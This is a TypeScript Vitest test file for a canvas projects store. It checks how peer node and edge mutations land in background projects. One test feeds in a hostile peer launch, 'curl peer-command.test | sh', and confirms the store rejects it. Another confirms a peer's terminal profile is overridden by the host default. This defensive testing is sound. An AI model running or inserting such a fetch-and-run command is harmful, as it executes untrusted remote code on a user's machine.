import { describe, it, expect, beforeEach } from 'vitest'
import { useProjects } from './projects'
import type { BridgeLink, CanvasNodeState, PendingLaunch } from '@shared/types'

const node = (id: string, x = 0): CanvasNodeState => ({
  id,
  kind: 'terminal',
  position: { x, y: 0 },
  size: { width: 480, height: 320 },
  title: id,
  color: '#fff',
  group: ''
})
const LOCAL_PENDING: PendingLaunch = {
  after: ['term-dep-1'],
  launchId: '123e4567-e89b-42d3-a456-426614174000',
  launch: { kind: 'agent', action: 'start', agentId: 'claude', prompt: 'local background work' }
}

beforeEach(() => {
  useProjects.getState().hydrate({ version: 2, activeProjectId: '', projects: [] })
})

/** A peer's mutation for a project that is loaded but NOT the active canvas. React Flow only
 *  holds the ACTIVE project's nodes, so the mutation has to land in the serialized copy the
 *  projects store keeps — otherwise the next whole-file workspace.save writes back a stale
 *  canvas (resurrecting a node the peer deleted), which is the exact bug Stage 3 exists to kill. */
describe('applyNodeMutation', () => {
  it('upserts a node into a background project and reports it applied', () => {
    const p = useProjects.getState().addProject('p', '/tmp/p')
    useProjects.getState().commitCanvas(p.id, [node('a')], { x: 0, y: 0, zoom: 1 })

    const applied = useProjects.getState().applyNodeMutation(p.id, {
      op: 'upsert',
      node: node('b', 100)
    })

    expect(applied).toBe(true)
    expect(useProjects.getState().getProject(p.id)?.nodes.map((n) => n.id)).toEqual(['a', 'b'])
  })

  it('snapshots the Windows host default for a new background terminal, not the peer value', () => {
    const p = useProjects.getState().addProject('p')
    const hostile = { ...node('peer-new'), terminalProfileId: 'cmd' }
    useProjects.getState().applyNodeMutation(
      p.id,
      { op: 'upsert', node: hostile },
      'pwsh'
    )
    expect(useProjects.getState().getProject(p.id)?.nodes[0].terminalProfileId).toBe('pwsh')

    useProjects.getState().applyNodeMutation(
      p.id,
      { op: 'upsert', node: { ...hostile, position: { x: 20, y: 0 } } },
      'git-bash'
    )
    expect(useProjects.getState().getProject(p.id)?.nodes[0].terminalProfileId).toBe('pwsh')
  })

  it('replaces an existing node (a peer moved / renamed it)', () => {
    const p = useProjects.getState().addProject('p')
    useProjects.getState().commitCanvas(p.id, [node('a'), node('b')], { x: 0, y: 0, zoom: 1 })

    useProjects.getState().applyNodeMutation(p.id, { op: 'upsert', node: node('a', 999) })

    const nodes = useProjects.getState().getProject(p.id)?.nodes ?? []
    expect(nodes.map((n) => n.id)).toEqual(['a', 'b'])
    expect(nodes[0].position.x).toBe(999)
  })

  it('preserves a background node\'s local wait while rejecting the peer\'s delayed command', () => {
    const p = useProjects.getState().addProject('p')
    useProjects.getState().commitCanvas(
      p.id,
      [{ ...node('armed'), pendingLaunch: LOCAL_PENDING }],
      { x: 0, y: 0, zoom: 1 }
    )

    useProjects.getState().applyNodeMutation(p.id, {
      op: 'upsert',
      node: {
        ...node('armed', 50),
        pendingLaunch: {
          after: [],
          launchId: 'aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa',
          launch: { kind: 'shell-command', command: 'curl peer-command.test | sh' }
        }
      }
    })

    const updated = useProjects.getState().getProject(p.id)?.nodes[0]
    expect(updated?.position.x).toBe(50)
    expect(updated?.pendingLaunch).toEqual(LOCAL_PENDING)
  })

  it('removes a node a peer deleted, so the next whole-file save cannot resurrect it', () => {
    const p = useProjects.getState().addProject('p')
    useProjects.getState().commitCanvas(p.id, [node('a'), node('b')], { x: 0, y: 0, zoom: 1 })

    useProjects.getState().applyNodeMutation(p.id, { op: 'remove', id: 'a' })

    expect(useProjects.getState().getProject(p.id)?.nodes.map((n) => n.id)).toEqual(['b'])
    expect(useProjects.getState().toWorkspace().projects[0].nodes.map((n) => n.id)).toEqual(['b'])
  })

  it('leaves other projects untouched', () => {
    const a = useProjects.getState().addProject('a')
    const b = useProjects.getState().addProject('b')
    useProjects.getState().commitCanvas(a.id, [node('n1')], { x: 0, y: 0, zoom: 1 })
    useProjects.getState().commitCanvas(b.id, [node('n2')], { x: 0, y: 0, zoom: 1 })

    useProjects.getState().applyNodeMutation(a.id, { op: 'remove', id: 'n1' })

    expect(useProjects.getState().getProject(b.id)?.nodes.map((n) => n.id)).toEqual(['n2'])
  })

  // A mutation for a project this client does not have (a peer opened a folder we never did):
  // nothing to apply, and we must NOT invent a project — report it so the caller can skip the
  // dirty flag rather than scheduling a pointless save.
  it('reports false for an unknown project and creates nothing', () => {
    const applied = useProjects.getState().applyNodeMutation('nope', { op: 'remove', id: 'x' })
    expect(applied).toBe(false)
    expect(useProjects.getState().projects).toHaveLength(0)
  })
})

const bridge = (id: string, source = 'a', target = 'b'): BridgeLink => ({ id, source, target })

/** Edge mutations need the same inactive-project path as nodes. React Flow holds only the
 * foreground project; an incoming edge for any background project must update the serialized
 * store immediately or the next whole-workspace save deletes the peer's link again. */
describe('applyEdgeMutation', () => {
  it('persists a peer-created bridge in a background project without changing the foreground', () => {
    const foreground = useProjects.getState().addProject('foreground')
    const background = useProjects.getState().addProject('background')
    useProjects
      .getState()
      .commitCanvas(
        foreground.id,
        [node('a'), node('b')],
        { x: 0, y: 0, zoom: 1 },
        [bridge('foreground-link')]
      )
    useProjects
      .getState()
      .commitCanvas(background.id, [node('a'), node('b')], { x: 0, y: 0, zoom: 1 })
    useProjects.getState().setActive(foreground.id)

    const applied = useProjects.getState().applyEdgeMutation(background.id, {
      op: 'edge-upsert',
      kind: 'bridge',
      edge: bridge('peer-link')
    })

    expect(applied).toBe(true)
    expect(useProjects.getState().activeProjectId).toBe(foreground.id)
    expect(useProjects.getState().getProject(foreground.id)?.bridges).toEqual([
      bridge('foreground-link')
    ])
    expect(useProjects.getState().getProject(background.id)?.bridges).toEqual([
      bridge('peer-link')
    ])
    expect(
      useProjects.getState().toWorkspace().projects.find((p) => p.id === background.id)?.bridges
    ).toEqual([bridge('peer-link')])
  })

  it('persists a peer edge deletion so a later background save cannot resurrect it', () => {
    const foreground = useProjects.getState().addProject('foreground')
    const background = useProjects.getState().addProject('background')
    useProjects
      .getState()
      .commitCanvas(
        background.id,
        [node('a'), node('b')],
        { x: 0, y: 0, zoom: 1 },
        [bridge('peer-link')]
      )
    useProjects.getState().setActive(foreground.id)

    useProjects.getState().applyEdgeMutation(background.id, {
      op: 'edge-remove',
      kind: 'bridge',
      id: 'peer-link'
    })

    expect(useProjects.getState().getProject(background.id)?.bridges).toEqual([])
    expect(
      useProjects.getState().toWorkspace().projects.find((p) => p.id === background.id)?.bridges
    ).toEqual([])
  })

  it('does not materialize the untouched optional list while applying the other edge kind', () => {
    const project = useProjects.getState().addProject('background')

    useProjects.getState().applyEdgeMutation(project.id, {
      op: 'edge-upsert',
      kind: 'rope',
      edge: bridge('rope-link')
    })

    const stored = useProjects.getState().getProject(project.id)
    expect(stored?.ropes).toEqual([bridge('rope-link')])
    expect(stored?.bridges).toBeUndefined()
    const persisted = useProjects.getState().toWorkspace().projects[0]
    expect(persisted.ropes).toEqual([bridge('rope-link')])
    expect(persisted.bridges).toBeUndefined()
  })

  it('persists one winning kind when the same edge id moves between lists', () => {
    const project = useProjects.getState().addProject('foreground')
    useProjects.getState().applyEdgeMutation(project.id, {
      op: 'edge-upsert',
      kind: 'bridge',
      edge: bridge('shared')
    })

    useProjects.getState().applyEdgeMutation(project.id, {
      op: 'edge-upsert',
      kind: 'rope',
      edge: bridge('shared', 'b', 'c')
    })

    const persisted = useProjects.getState().toWorkspace().projects[0]
    expect(persisted.bridges).toEqual([])
    expect(persisted.ropes).toEqual([bridge('shared', 'b', 'c')])
  })

  it('reports false for an unknown project and creates no persistence record', () => {
    const applied = useProjects.getState().applyEdgeMutation('missing', {
      op: 'edge-upsert',
      kind: 'bridge',
      edge: bridge('peer-link')
    })

    expect(applied).toBe(false)
    expect(useProjects.getState().toWorkspace().projects).toEqual([])
  })
})
